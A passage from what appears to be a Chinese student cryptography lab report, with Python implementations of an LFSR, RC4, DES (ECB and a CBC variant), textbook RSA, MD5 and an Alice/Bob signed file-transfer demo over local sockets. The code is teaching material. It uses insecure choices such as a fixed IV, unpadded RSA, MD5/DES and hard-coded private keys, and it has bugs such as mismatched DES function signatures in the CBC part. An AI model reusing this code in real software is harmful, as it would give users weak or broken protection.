&#x27;E&#x27;: key = input(&#x27;请输入密钥: &#x27;) key = &quot;&quot;.join(filter(str.isalpha, key)) s = input(&#x27;请输入明文: &#x27;) s = &quot;&quot;.join(filter(str.isalpha, s)) # 将字符串中的非字母字符去掉 # print(s) encode(s, key) elif answer.upper() == &#x27;D&#x27;: key = input(&#x27;请输入密钥: &#x27;) key = &quot;&quot;.join(filter(str.isalpha, key)) s = input(&#x27;请输入密文: &#x27;) s = &quot;&quot;.join(filter(str.isalpha, s)) decode(s, key) else: print(&#x27;输入错误！&#x27;) except KeyError: print(&#x27;请检查输入是否正确！&#x27;) if __name__ == &#x27;__main__&#x27;: main() 二、序列密码LFSR代码实现 def lsrf(inti, top): sum = 0 inti2 = &quot;0&quot;*len(inti) inti2 = list(inti2) inti1 = &#x27;&#x27; for i in range(len(inti)): if top[i] == &quot;1&quot;: sum += int(inti[i]) sum = sum % 2 for i in range(len(inti)): if i == 0: inti2[i] = str(sum) else: inti2[i] = inti[i - 1] inti1 = inti1.join(inti2) return inti1 def main(): inti_str = str(input(&quot;请输入初始化序列：&quot;)) inti_str = inti_str[::-1] inti_str_backup = inti_str top = str(input(&quot;请输入本原多项式：&quot;)) top = top[::-1] for i in range(2 ** len(inti_str) + 1): if inti_str_backup == inti_str and i != 0 and i == 2 ** len(inti_str) - 1: print(&quot;第&#123;0&#125;次&quot;.format(i), inti_str_backup) print(&quot;是本原多项式且周期是&quot; + str(i)) break elif inti_str_backup == inti_str and i != 0 and i != 2 ** len(inti_str) - 1: print(&quot;第&#123;0&#125;次&quot;.format(i), inti_str_backup) print(&quot;不是本原多项式且周期是&quot; + str(i)) break print(&quot;第&#123;0&#125;次&quot;.format(i), inti_str_backup) inti_str_backup = lsrf(inti_str_backup, top) if __name__ == &#x27;__main__&#x27;: main() 选择本原多项式和初始序列如下 100000000001000000 011100010100100101 程序运行结果 RC4完整代码 import hashlib import base64 # S盒初始化置换,Key为密钥 def Rc4_init(S, Key): j = 0 Key = Key.encode(&#x27;UTF-8&#x27;) Key = hashlib.md5(Key).hexdigest() # 长度为32的字符串 tmp = [] for i in range(256): S.append(i) tmp.append(Key[i % len(Key)]) for i in range(256): j = (j + S[i] + ord(tmp[i])) % 256 S[i], S[j] = S[j], S[i] # 交换S[i],S[j] def rc4_Encode(S, plaintext): i = j = 0 result = &#x27;&#x27; for a in plaintext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[t]) result += k result = base64.b64encode(result.encode(&#x27;UTF-8&#x27;)) result = result.decode() return result def rc4_Decode(S, criphtext): i = j = 0 criphtext = base64.b64decode(criphtext) criphtext = str(criphtext.decode()) result = &#x27;&#x27; for a in criphtext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[t]) result += k return result def main(): while 1: order = input(&quot;请输入指令,加密/E,解密/D :&quot;) if order.upper() ==&#x27;E&#x27;: plaintext = input(&#x27;请输入明文: &#x27;) key = input(&quot;请输入密钥: &quot;) s = [] Rc4_init(s, key) cryphtext = rc4_Encode(s, plaintext) print(&quot;密文为: &quot;, cryphtext) print(&#x27;\\n&#x27;) else: cryphtext = input(&quot;请输入密文: &quot;) key = input(&quot;请输入密钥: &quot;) s = [] Rc4_init(s, key) plaintext = rc4_Decode(s, cryphtext) print(&quot;明文为: &quot;, plaintext) print(&#x27;\\n&#x27;) if __name__ == &#x27;__main__&#x27;: main() 三、DESDEC_ECB模式 # 两字符进行异或运算 def xor(str1, str2): res = &quot;&quot; for i in range(0, len(str1)): xor_res = int(str1[i], 10)^int(str2[i], 10) if xor_res == 1: res += &#x27;1&#x27; else: res += &#x27;0&#x27; return res # 处理字符串，将每个字符串都转成八位二进制数 def str_process(str): res = &quot;&quot; for i in str: tmp = bin(ord(i))[2:] tmp = (8 - len(tmp)) * &#x27;0&#x27; + tmp # 不够八位则在前面补 0 res += tmp return res # PC-1盒处理 def key_change_1(str): change_table = [57,49,41,33,25,17,9,1, 58,50,42,34,26,18,10, 2,59,51,43,35,27,19,11, 3,60,52,44,36,63,55,47, 39,31,23,15,7,62,54,46, 38,30,22,14,6,61,53,45, 37,29,21,13,5,28,20,12,4] res = &quot;&quot; for i in change_table: res += str[i-1] return res # PC-2盒处理 def key_change_2(str): change_table = [14,17,11,24,1,5,3,28, 15,6,21,10,23,19,12,4, 26,8,16,7,27,20,13,2, 41,52,31,37,47,55,30,40, 51,45,33,48,44,49,39,56, 34,53,46,42,50,36,29,32] res = &quot;&quot; for i in change_table: res += str[i-1] return res # 循环左移 def left_run(str, num): tmp_str = str[num:len(str)] tmp_str = tmp_str+str[0:num] return tmp_str # 生成16个子密钥 def key_gen(str): key_list = [] key_change_res = key_change_1(str) key_c = key_change_res[0:28] key_d = key_change_res[28:] num = [0, 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1] for i in range(1, 17): #共16轮 key_c = left_run(key_c, num[i]) key_d = left_run(key_d, num[i]) key_yiwei = key_c + key_d key_res = key_change_2(key_yiwei) key_list.append(key_res) return key_list # IP盒处理 def begin_change(str): change_table = [58,50,42,34,26,18,10,2, 60,52,44,36,28,20,12,4, 62,54,46,38,30,22,14,6, 64,56,48,40,32,24,16,8, 57,49,41,33,25,17,9,1, 59,51,43,35,27,19,11,3, 61,53,45,37,29,21,13,5, 63,55,47,39,31,23,15,7] res = &quot;&quot; for i in change_table: res += str[i-1] return res # E盒处理 32位-&gt;48位 def E_box(str): change_table = [32,1,2,3,4,5,4,5, 6,7,8,9,8,9,10,11, 12,13,12,13,14,15,16,17, 16,17,18,19,20,21,20,21, 22,23,24,25,24,25,26,27, 28,29,28,29,30,31,32,1] res = &quot;&quot; for i in change_table: res += str[i-1] return res # s盒处理 48位-&gt;32位 def S_box(str): j = 0 s_list = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13], [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9], [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12], [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14], [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3], [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13], [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12], [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11] ] res = &quot;&quot; for i in range(0, len(str), 6): begin_s = str[i:i + 6] row = int(begin_s[0] + begin_s[5], 2) #第一位和第六位作为行 col = int(begin_s[1:5], 2) #中间四位作为列 index = s_list[j][row * 16 + col] num = bin(index)[2:] #将匹配的数字转换位二进制数 for k in range(0, 4 - len(num)): #不够4位则补0 num = &quot;0&quot; + num res += num j = j + 1 return res # p盒处理 置换操作 def P_box(str): res = &quot;&quot; change_table = [16,7,20,21,29,12,28,17, 1,15,23,26,5,18,31,10, 2,8,24,14,32,27,3,9, 19,13,30,6,22,11,4,25] for i in change_table: res += str[i - 1] return res # F函数 def F_function(str, key): # R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或-&gt;S盒-&gt;P置换 str_e_res = E_box(str) # 将 E 异或 S P 集合到一个函数种，便于调用 xor_res = xor(str_e_res, key) str_s_res = S_box(xor_res) str_p_res = P_box(str_s_res) return str_p_res # 逆IP盒 def IP_re(str): res = &quot;&quot; ip_list = [40,8,48,16,56,24,64,32, 39,7,47,15,55,23,63,31, 38,6,46,14,54,22,62,30, 37,5,45,13,53,21,61,29, 36,4,44,12,52,20,60,28, 35,3,43,11,51,19,59,27, 34,2,42,10,50,18,58,26, 33,1,41,9,49,17,57,25 ] for i in ip_list: res += str[i-1] return res # DES加密操作 def DESencode(text, key): text_bin = str_process(text) # 将字符转换为二进制数 text_IP = begin_change(text_bin) # 明文初始置换 key_bin = str_process(key) # 将密钥转换位二进制数 key_list = key_gen(key_bin) # key_lsst 数组中存放着十六个子密钥 text_left = text_IP[0:32] # R0 text_right = text_IP[32:] # L0 for i in range(0, 15): # 十五轮加密 mes_tmp = text_right # 临时变量用于左右两部分交换 text_right = xor(F_function(text_right, key_list[i]) , text_left) #F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位) text_left = mes_tmp fin_right = text_right # 第十六轮加密 fin_left = xor(F_function(text_right, key_list[15]), text_left) criph_text = fin_left + fin_right criph_text = IP_re(criph_text) # IP逆置换 return criph_text # 针对一组的解密程序 def DESdecode(text, key): #密文直接输64位2进制 key_bin = str_process(key) # 将密钥转换为二进制数 key_list = key_gen(key_bin) # 生成的十六个子密钥 text = begin_change(text) # 先初始值换 与加密过程相反 cipher_left = text[0:32] # R16 cipher_right = text[32:] # L16 i = 15 while i &gt; 0: # 十五轮加密 反过来 cipher_tmp = cipher_right #设置一个临时变量用于后面的交换 cipher_right = xor(cipher_left, F_function(cipher_right, key_list[i])) # F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位) # F 函数处理完后与L(32位)异或 cipher_left = cipher_tmp # 左右交换完成 i = i - 1 left_text = xor(cipher_left, F_function(cipher_right, key_list[0])) # 一 right_text = cipher_right # 二 三 这三步是第十六轮加密 plain_bin = left_text + right_text # plain_bin = IP_re(plain_bin) # plain_text = &quot;&quot; for i in range(0, len(plain_bin), 8): plain_text += chr(int(plain_bin[i:i + 8], 2)) return plain_text def Divide_text(order,text,key): # 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组 block_text = [] res = &quot;&quot; length = 0 if order == &quot;E&quot;: length = 8 else: length = 64 i = 0 while text[i:i+length] != &quot;&quot;: block_text.append(text[i:i+length]) i += length if order == &#x27;E&#x27;: if len(block_text[-1]) != 8: # 最后一组明文如果不够八个字符则添加 + 补齐八个 否则程序会报错 block_text[-1] = block_text[-1] + &#x27;+&#x27; * (8 - len(block_text[-1])) for text in block_text: # 分别对每组加密 res += DESencode(text, key) else: for text in block_text: # 对密文解密 res += DESdecode(text, key) return res def main(): while 1: plaintext = &#x27;&#x27; ciphertext = &#x27;&#x27; key = &#x27;&#x27; order = input(&quot;加密请按E,解密请按D:&quot;) if order == &#x27;E&#x27;: plaintext = input(&quot;请输入明文：&quot;) key = input(&quot;请输入密钥：&quot;) ciphertext = Divide_text(order, plaintext, key) print(&quot;密文是：&quot;) print(ciphertext) else: ciphertext = input(&quot;请输入密文：&quot;) key = input(&quot;请输入密钥：&quot;) plaintext = Divide_text(order, ciphertext, key) print(&quot;明文是：&quot;) print(plaintext) if __name__ == &#x27;__main__&#x27;: main() DES_CBC模式 只需要修改ECB模式中的 Divide_text 部分 def Divide_text(order,text,key): # 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组 block_text = [] IV = &#x27;aaaaaaaa&#x27; # 初始化向量 IV_bin = str_process(IV) res = &quot;&quot; length = 0 if order == &quot;E&quot;: length = 8 else: length = 64 i = 0 while text[i:i+length] != &quot;&quot;: block_text.append(text[i:i+length]) i += length tmp = &quot;&quot; # 加密 if order == &#x27;E&#x27;: if len(block_text[-1]) != 8: # 最后一组明文如果不够八个字符则添加 + 补齐八个 否则程序会报错 block_text[-1] = block_text[-1] + &#x27;+&#x27; * (8 - len(block_text[-1])) for i in range(len(block_text)): # 分别对每组加密 if i == 0 : tmp = DESencode(block_text[i],key, IV_bin) res += tmp else: tmp = DESencode(block_text[i],key,tmp) res += tmp # 解密 else: for i in range(len(block_text)): if i == 0: tmp = block_text[i] res += DESdecode(block_text[i], key, IV_bin) else: res += DESdecode(block_text[i], key, tmp) tmp = block_text[i] return res 四、RSA# -*- coding = utf - 8 -*- #@Time : 2020/12/23 14:24 #@Author : sunzy #@File : rsa.py from Crypto.Util.number import * import random # 模重复平方法 def fast_mod(p,q,n): # p为底数，p为指数 res = 1 while q: if q &amp; 1: res = (res * p) % n q &gt;&gt;= 1 # 右移1位 p = (p * p) % n return res # 计算出d #这个扩展欧几里得算法求模逆,用于求d def caculateD(a, m): u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m # 将字符转化为十六进制字符串 def str2Hex(m): return &quot;&quot;.join(&quot;&#123;:02x&#125;&quot;.format(ord(x)) for x in m) # 素性检验：采用 Miler-Rabin 检验法 # 所有的𝑟 ∈ [0, 𝑠 − 1]，若𝑎^𝑑 ≠ 1(𝑚𝑜𝑑 𝑛)且𝑎^((2^𝑟)*𝑑) ≠ −1(𝑚𝑜𝑑 𝑛)，则𝑛是合数。否则，𝑛有 3/4的概率为素数 def miller_rabin(n): s = n - 1 t = 0 while s % 2 == 0: # n,s,t之间的关系为 n = 2^s * t s = s // 2 t += 1 for trials in range(10): # 可以多增加几轮保证大概率为素数 a = random.randrange(2, n - 1) # 随机生成a v = pow(a, s, n) # 验证 a^(n-1) mod n if v != 1: i = 0 while v != (n - 1): if i == t - 1: return False else: i = i + 1 v = (v ** 2) % n return True # 生成素数 先生成1024位的奇数，再进行素性检验，通过则生成该素数 def genPrime(b=1024): while True: # 设置死循环直到生成素数才退出 res = &quot;1&quot; for i in range(b-2): res += str(random.randint(0,1)) res += &quot;1&quot; # 最后一位为1保证为奇数 res = int(res,2) if miller_rabin(res): return res # 直到该数通过素数检验才推出循环 def genE(phi_n): while True: e = genPrime(b=random.randint(3,13)) #随机生成e if e &lt; 2000 : # e不能太小 continue if phi_n%e != 0: # 保证e不能被phi整除 return e def RSAEncode(m, e, n): # 加密公式 m^e mod n m = int(str2Hex(m), 16) # 将字符转换为二进制 c = fast_mod(m, e, n) return c def RSADecode(c, d, n): # 加密公式 c^d mod n plaintext = fast_mod(c,d,n) plaintext = str(long_to_bytes(plaintext).decode()) # 将数字转换为字符 return plaintext def main(): # 生成两个大素数p和q print(&quot;Generate p,q and e, please wait... &quot;) p = genPrime() q = genPrime() print (&quot;p = &quot;+str(p)) print (&quot;q = &quot;+str(q)) n = p*q print (&quot;n = &quot;+str(n)) # 用欧拉定理计算 phi_n phi_n = (p-1)*(q-1) # 生成e e = genE(phi_n) print (&quot;e = &quot;+str(e)) # m = &quot;Hello world!&quot; m = str(input(&#x27;请输入明文: &#x27;)) # 加密算法 Cryphtext = RSAEncode(m, e, n) print (&quot;The Ciphertext is: &quot;+str(Cryphtext)) # 解密算法 d = caculateD(e, phi_n) Plaintext = RSADecode(Cryphtext, d, n) print (&quot;The Plaintext is: &quot;+Plaintext) if __name__ == &#x27;__main__&#x27;: main() 五、MD5# -*- coding = utf - 8 -*- #@Time : 2020/12/18 21:50 #@Author : sunzy #@File : MD5.py import math # 定义初始向量abcd,并将其转换成2进制,且补0到32位 # 标准的幻数（物理顺序）是（A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是: # （A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L） ABCD_list = [&#x27;67452301&#x27;,&#x27;efcdab89&#x27;,&#x27;98badcfe&#x27;,&#x27;10325476&#x27;] for i in range(len(ABCD_list)): tmp = bin(int(ABCD_list[i], 16))[2:] if len(tmp) &lt; 32: tmp = (32 - len(tmp)) * &#x27;0&#x27; + tmp ABCD_list[i] = tmp A0,B0,C0,D0 = ABCD_list[0], ABCD_list[1], ABCD_list[2], ABCD_list[3] # 生成第1-64个式子的第i个32比特常数 Ti = [] for i in range(0, 64): result = (int(4294967296 * abs(math.sin(i + 1)))) &amp; 0xffffffff result = bin(result)[2:] if len(result) &lt; 32: result = (32 - len(result)) * &#x27;0&#x27; + result Ti.append(result) # 实现x,y的逐比特与 def and1(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])&amp;int(y[i])) return res # 实现x,y的逐比特或 def or1(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])|int(y[i])) return res # 实现x,y的逐比特异或 def xor(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])^int(y[i])) return res # 实现x的逐比特逻辑反 def reverse(x): res = &#x27;&#x27; for i in range(0, len(x)): res += str((int(x[i], 2) + 1) % 2) return res # 实现x的循环左移 def shift(x, i): res = &#x27;&#x27; for t in range(0, len(x) - i): res = res + x[t + i:t + i + 1] # 先保存 x[i:] 再保存x[:i] for y in range(0, i): res = res + x[y:y + 1] return res # 实现整数模2的三十二次方加法 def add(x, y): a = int(x,2) #先将二进制转换成十进制 b = int(y,2) res = (a + b)%(2**32) res = str(bin(res)[2:]) if len(res) != 32: # 补充到32位 res = (32-len(res))*&#x27;0&#x27;+res return res # 定义f,g,h,i函数 def ffunc(x, y, z): # ((x&amp;y)|((~x)&amp;z)) t = and1(x, y) t1 = reverse(x) t2 = and1(t1, z) return or1(t, t2) def gfunc(x, y, z): # ((x&amp;z)|(y&amp;(~z))) t = and1(x, z) t1 = reverse(z) t2 = and1(y, t1) return or1(t, t2) def hfunc(x, y, z): # (x^y^z) t1 = xor(x, y) t2 = xor(t1, z) return t2 def ifunc(x, y, z): # (y^(x|(~z))) t = reverse(z) t1 = or1(x, t) return xor(y, t1) def fill(text): text1 = &#x27;&#x27; for i in text: t = str(ord(i)) t = str(bin(int(t, 10))[2:]) if len(t) &lt; 8: # 将每个字符转换成8位二进制数 for num in range(8 - len(t)): t = &#x27;0&#x27; + t text1 = text1 + t length = len(text1) length1 = 512 - len(text1) - 65 # length1是要填充0的位数 text1 = text1 + &#x27;1&#x27; # 第一位添加 0 text1 = text1 + &#x27;0&#x27;*length1 # 将其补充到 N*512+448 N可以为0 text2 = bin(length)[2:] # 将字符长度转换成二进制数 if len(text2) &lt; 8: # 填充后面64位,先填充字符串的长度,再补0 text2 = &#x27;0&#x27;*(8 - len(text2)) + text2 length2 = 64 - len(text2) text2 = text2 + &#x27;0&#x27;*length2 # 填充后面64位,先填充字符串的长度,再补0 return text1 + text2 # 将最后得到的ABCD逆序输出 最后一步使用 def reverse_order(a): res = a[24:32] + a[16:24] + a[8:16] + a[0:8] return res # 输入要加密的明文 password = input(&quot;请输入要加密的信息:&quot;) # 填充算法 x = fill(password) j = 0 M = [] for i in range(0,len(x),32): # 将512位分成十六组 M.append(x[i:i+32]) M[j] = M[j][24:32] + M[j][16:24] + M[j][8:16] + M[j][0:8] j+=1 # md5算法的第一步 A,B,C,D= A0,B0,C0,D0 #为第五步 相加原始的A,B,C,D做备份 # md5算法的第二步 AA,BB,CC,DD = A,B,C,D # md5算法的第三步 # 第一轮 每轮A,B,C,D都处理四次，四轮就是十六次，一共六十四次 for i in range(4): # f函数 A = add(B, shift(add(A, add(add(ffunc(B, C, D), M[4*i]), Ti[4 * i])), 7)) D = add(A, shift(add(D, add(add(ffunc(A, B, C), M[4*i+1]), Ti[4 * i + 1])), 12)) C = add(D, shift(add(C, add(add(ffunc(D, A, B), M[4*i+2]), Ti[4 * i + 2])), 17)) B = add(C, shift(add(B, add(add(ffunc(C, D, A), M[4*i+3]), Ti[4 * i + 3])), 22)) # 第二轮 k = 1 j = 16 for i in range(4): A = add(B, shift(add(A, add(add(gfunc(B, C, D), M[(k+5*(4*i))%16]), Ti[j + i * 4])), 5)) D = add(A, shift(add(D, add(add(gfunc(A, B, C), M[(k+5*(4*i+1))%16]), Ti[j + i * 4 + 1])), 9)) C = add(D, shift(add(C, add(add(gfunc(D, A, B), M[(k+5*(4*i+2))%16]), Ti[j + i * 4 + 2])), 14)) B = add(C, shift(add(B, add(add(gfunc(C, D, A), M[(k+5*(4*i+3))%16]), Ti[j + i * 4 + 3])), 20)) # 第三轮 k = 5 j = 32 for i in range(4): A = add(B, shift(add(A, add(add(hfunc(B, C, D), M[(k+i*4*3)%16]), Ti[j + i * 4])), 4)) D = add(A, shift(add(D, add(add(hfunc(A, B, C), M[(k+(i*4+1)*3)%16]), Ti[j + i * 4 + 1])), 11)) C = add(D, shift(add(C, add(add(hfunc(D, A, B), M[(k+(i*4+2)*3)%16]), Ti[j + i * 4 + 2])), 16)) B = add(C, shift(add(B, add(add(hfunc(C, D, A), M[(k+(i*4+3)*3)%16]), Ti[j + i * 4 + 3])), 23)) # 第四轮 k = 0 j = 48 for i in range(4): A = add(B, shift(add(A, add(add(ifunc(B, C, D), M[(k+(i*4)*7)%16]), Ti[j + i * 4])), 6)) D = add(A, shift(add(D, add(add(ifunc(A, B, C), M[(k+(i*4+1)*7)%16]), Ti[j + i * 4 + 1])), 10)) C = add(D, shift(add(C, add(add(ifunc(D, A, B), M[(k+(i*4+2)*7)%16]), Ti[j + i * 4 + 2])), 15)) B = add(C, shift(add(B, add(add(ifunc(C, D, A), M[(k+(i*4+3)*7)%16]), Ti[j + i * 4 + 3])), 21)) # 第五步 将计算出的A,B,C,D与初始的相加，并赋值 A,B,C,D = add(A, AA),add(B, BB),add(C, CC),add(D, DD) # 输出得到的密文 ciphertext = reverse_order(A) + reverse_order(B) + reverse_order(C) + reverse_order(D) cipher = ciphertext ciphertext = str(hex(int(ciphertext, 2))[2:]) # 将二进制数转换为十六进制数 ciphertext = &#x27;0&#x27;*(32-len(ciphertext))+ciphertext # 为了避免第一个数字为零时无法显示出来 print(&quot;hash值(小写):&quot;,ciphertext) print(&quot;hash值(大写):&quot;,ciphertext.upper()) 六、综合实验6.1 实验内容现在，Alice想通过公共信道给Bob传输一份秘密文件（文件非常大）。又知道，很多人和机构想得到这份文件。需要设计一个通信模型，来保证文件的机密性和完整性。 现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。 6.2 分析实验需求现在很多人想要得到这份文件，那么，可能会有很多人在假冒Bob的身份，来请求得到这个文件，需要对Bob身份进行验证；也有可能是很多人得不到文件，就假冒Alice的身份，想要给Bob发送文件，如果有人发送恶意文件给Bob，Bob发现不是想要的文件，但这个文件给Bob电脑安装了后门，等他接受了正确的文件，就存在泄漏的风险，所以需要对Alice身份进行验证。 根据分析，所得结果如下: 传输的是秘密文件，所以可能存在人冒充bob接收文件，所以Alice在与传输文件之前需要对bob的身份进行认证，而且bob防止被欺骗也需要对Alice的身份进行认证，这里可以采用第二类签名算法。 在确认彼此身份后需要将文件通过公共信道传输，但是可能存在攻击人劫持，所以需要对文件内容加密，而文件内容很大，考虑到加密速度问题，所以采用对称加密算法。 采用对称加密算法需要密钥，而这里使用随机生成的密钥。并且这个密钥也需要传给bob用于解密，但是公共信道不安全，所以也需要对该密钥进行加密。考虑到密钥长度不是很大，所以可以采用公钥加密算法，而且公钥加密算法可以解决传输此次加密使用的密钥，提高安全性和效率。 Bob收到密文和加密后的密钥，使用自己的私钥解密出对称加密算法使用的密钥，然后使用密钥解密密文后向Alice发送确认消息，确保bob收到消息。 确认消息也要使用到第一步使用的签名算法。 6.3 程序流程图 6.4 完整代码Alice # -*- coding = utf - 8 -*- #@Time : 2021/1/3 23:17 #@Author : sunzy #@File : Alice.py from RSA import * from DES import * from MD5 import * from file_decode import * import socket n_bob = 81836285346168841919828227774710209132464519960137459236348092425786962849543 n = 44531776921047477359676235110843825307036514195195627878765712056028758572817 d = 34159352569920789505556306994405309761109146525598570740717995833480670158209 e = 65537 name = &quot;This is alice.&quot; client = socket.socket() client.connect((&#x27;127.0.0.1&#x27;,8888)) # 本机地址和端口 data = client.recv(1024) print(str(data, &quot;utf-8&quot;),end=&quot;&quot;) client.send(b&#x27;1&#x27;) print(&quot;等待bob验证自身身份...&quot;) # alice送出自己的身份信息和签名值 client.send(bytes(name,&#x27;utf-8&#x27;)) # alice发送身份明文信息 client.recv(1024).decode() hash_name = md5(name) crpto_name = str(RSAEncode(hash_name, d, n)) # 发送对hash值加密后的值 crpto_name = bytes(crpto_name,&#x27;utf-8&#x27;) client.send(crpto_name) print(client.recv(1024).decode()) # 接收身份认证的结果 #接收bob身份hash并验证 print(&quot;验证bob身份...&quot;,end=&quot;&quot;) a=input() bob_name = client.recv(512).decode() # bob发送过来的身份明文信息 client.send(b&#x27;1&#x27;) hash_name = client.recv(512).decode() # bob使用自己的私钥加密身份明文信息hash值后的值 plain_text = RSADecode(int(hash_name),e,n_bob) # 使用bob的公钥解密上一步的值 client.send(b&#x27;1&#x27;) if plain_text == md5(bob_name): # 验证是不是bob print(bob_name) print(&quot;验证通过!&quot;) else: exit(&quot;验证错误!&quot;) while 1: a = input() bin_key = gen_key() # 随机生成64位的 DES加密明文使用的密钥 int_key = int(bin_key,2) # 将其转换为十进制数，便于后面使用RSA算法加密 print(&quot;随机产生对称密钥:&quot;,int_key) # 每次传输随机产生一个密钥更加安全 plain = read_file() # 读取文件内容 bin_cipher = DES_encode(plain, bin_key) # 使用DES算法加密内容 a = input() int_key = fast_mod(int_key,e,n_bob) # 加密DES的密钥 e是bob的公钥 print(&quot;加密对称密钥&quot;) print(&quot;传输密钥...&quot;) # 传输加密后DES密钥 client.sendall(bytes(str(int_key),&quot;utf-8&quot;)) client.recv(512) length = str(len(bin_cipher)) # 传输发送内容的长度 length = bytes(length,&quot;utf-8&quot;) # 方便其接收 client.send(length) print(&quot;传输密文...&quot;) client.sendall(bytes(str(bin_cipher),&quot;utf-8&quot;)) #发送密文 message = client.recv(512).decode() client.send(b&#x27;1&#x27;) crypt_message = client.recv(512).decode() hash_message = RSADecode(int(crypt_message),e,n_bob) if hash_message == md5(message): print(message) print(&quot;文件传输结束！&quot;) break client.close() Bob # -*- coding = utf - 8 -*- #@Time : 2021/1/3 23:17 #@Author : sunzy #@File : bob.py import socket import libnum from RSA import * from DES import * from MD5 import * name = &quot;This is bob.&quot; n = 81836285346168841919828227774710209132464519960137459236348092425786962849543 n_alice = 44531776921047477359676235110843825307036514195195627878765712056028758572817 d = 39540198292360595989919600111176873707392294831248672388670326288876701993673 e = 65537 # e_alice = 2081 server = socket.socket() #创建对象 server.bind((&quot;localhost&quot;,8888))#绑定 ip和端口 server.listen() #监听 #等待连接 print(&#x27;Waiting connection...&#x27;) #接受请求，返回套接字对象和IP+端口号 con,addr = server.accept() con.send(bytes(&quot;Welcome connect!\\n开始加密传输:\\n&quot;,&quot;utf-8&quot;)) con.recv(1024) # 验证alice身份 print(&quot;验证alice身份...&quot;) a = input() alice_name = con.recv(512).decode() # alice 的明文信息 con.send(b&#x27;1&#x27;) hash_name = con.recv(512).decode() # alice 用私钥加密明文的hash值 plain_text = RSADecode(int(hash_name),e,n_alice) # 用alice 的公钥解密出hash值 if plain_text == md5(alice_name): # 判断上一步的值与md5函数加密是否相同 print(alice_name) # 如果二者相同则可以保证对方是alice,这里的安全性是由公钥算法和hash函数保证 print(&quot;验证通过！&quot;) # 因为只有alice有自己的私钥，hash函数的存在防止伪造明文攻击 con.send(bytes(&quot;您通过了验证!&quot;,&quot;utf-8&quot;)) else: exit(&quot;这不是alice,验证错误！&quot;) #送出自己的身份信息和签名值 print(&quot;等待alice验证自身身份...&quot;) con.send(bytes(name,&#x27;utf-8&#x27;)) # 向alice发送身份信息的明文 con.recv(1024).decode() hash_name = md5(name) # 明文信息的hash值 crpto_name = str(RSAEncode(hash_name, d, n)) # 使用自己的私钥加密上一步的hash值 crpto_name = bytes(crpto_name,&#x27;utf-8&#x27;) # 发送给alice con.send(crpto_name) con.recv(1024) while 1: data = con.recv(1024) # 接收alice发送的使用公钥算法加密后的DES的密钥 data = data.decode() int_key = int(data) print(&quot;被加密后的密钥:&quot;,int_key) int_key = fast_mod(int_key, d, n) # 使用私钥d解密出DES密钥 print(&quot;解密后的密钥&quot;, int_key) print(&quot;----&quot;*10) # 接收密文的长度（为了方便存储） con.send(b&#x27;1&#x27;) length = con.recv(1024) length = int(length.decode()) buff = [] size = 0 while size &lt; length: # 开始接受密文 dat = con.recv(1024) size += len(dat.decode()) buff.append(dat) data = b&#x27;&#x27;.join(buff) bin_cipher = data.decode() cipher = bin_to_str(bin_cipher) bin_key = bin(int_key)[2:] 